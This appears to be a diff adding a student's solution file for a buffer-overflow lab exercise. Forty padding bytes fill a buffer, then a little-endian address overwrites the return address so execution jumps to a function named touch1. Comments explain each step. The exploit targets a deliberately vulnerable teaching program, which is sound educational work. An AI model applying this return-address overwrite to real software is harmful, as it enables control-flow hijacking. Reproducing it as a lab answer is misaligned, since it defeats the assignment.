@@ -1,0 +1,8 @@
+/* Overwriting the buffer named buf. We just want to reach the return address. We could use any other byte encoding. */
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
+/* Overwriting the return address in order to reach touch1 instead of test. touch1's address is 0x4017c0. */
+c0 17 40 00 00 00 00 00
+
+
+
